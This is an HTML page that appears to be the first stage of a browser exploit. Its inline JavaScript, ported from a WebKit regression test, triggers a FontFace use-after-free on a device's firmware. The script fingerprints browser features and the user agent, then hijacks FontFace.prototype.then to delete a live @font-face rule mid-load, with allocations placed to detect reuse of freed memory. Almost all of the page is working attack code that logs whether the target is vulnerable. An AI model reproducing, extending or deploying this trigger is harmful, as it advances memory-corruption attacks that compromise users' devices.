<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>P1</title>
<style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
<style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
</head>
<body>
<h3 id="st">stage A</h3>
<pre id="out"></pre>
<script>
// Phase 1 v4: verbatim port of WebKit's LayoutTests/fast/text/fontface-setstatus-crash.html
// + on-screen instrumentation. Crash = FontFace UAF LIVE on this firmware.
function log(s) {
  document.getElementById('out').textContent += s + "\n";
}

// Stage A: markers (unchanged)
var markers = {
  'URL.canParse': typeof URL !== 'undefined' && typeof URL.canParse === 'function',
  'Promise.try': typeof Promise !== 'undefined' && typeof Promise.try === 'function',
  'Array.fromAsync': typeof Array !== 'undefined' && typeof Array.fromAsync === 'function',
  'RegExp.escape': typeof RegExp !== 'undefined' && typeof RegExp.escape === 'function',
  'setMethods': typeof Set !== 'undefined' && typeof Set.prototype.union === 'function',
  'iteratorHelpers': typeof Iterator !== 'undefined' && typeof Iterator.from === 'function',
  'float16': typeof Float16Array !== 'undefined',
  'cssRegisterProperty': typeof CSS !== 'undefined' && typeof CSS.registerProperty === 'function',
  'structuredClone': typeof structuredClone === 'function'
};
var keys = Object.keys(markers);
for (var i = 0; i < keys.length; i++) log(keys[i] + ' = ' + markers[keys[i]]);
log('UA = ' + navigator.userAgent);

// Stage B: the REAL regression-test trigger
function trigger() {
  log('stage B: trigger in 3s');
  setTimeout(function () {
    log('triggering (real regression-test shape)');

    // JS-created face with a LOCAL source so it resolves synchronously.
    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);

    // Register a DeferredPromise on A.
    void A.loaded;

    var fired = 0;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function () {
        fired++;
        if (this === A && fired <= 3) {
          log('GETTER FIRED #' + fired + ' - re-entrancy path ACTIVE');
          if (fired === 1) {
            // Allocate to help detect freed-memory reuse.
            new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
            new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
            // Remove the CSS @font-face rule and force style recalc.
            var sheet = document.getElementById('s0').sheet; var n0 = sheet ? sheet.cssRules.length : -1; log('rules before delete: ' + n0); try { sheet.deleteRule(0); log('deleteRule OK, rules now: ' + sheet.cssRules.length + ' - FACE FREED'); } catch (e) { log('deleteRule FAILED: ' + e); }
            document.body.offsetTop;
          }
        }
        return undefined;
      }
    });

    // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule).
    try {
      document.fonts.load('1em x', 'AB').then(
        function (faces) {
          log('load resolved with ' + (faces ? faces.length : '?') +
              ' faces, getter fired ' + fired + 'x - SURVIVED = likely patched');
        },
        function (e) { log('load rejected: ' + e + ' (getter fired ' + fired + 'x)'); }
      );
    } catch (e) {
      log('load threw: ' + e);
    }

    setTimeout(function () { log('survived 8s - load promise settled? see resolve/reject lines above'); }, 8000);
  }, 3000);
}

log('stage A done');
window.onload = trigger;
</script>
</body>
</html>
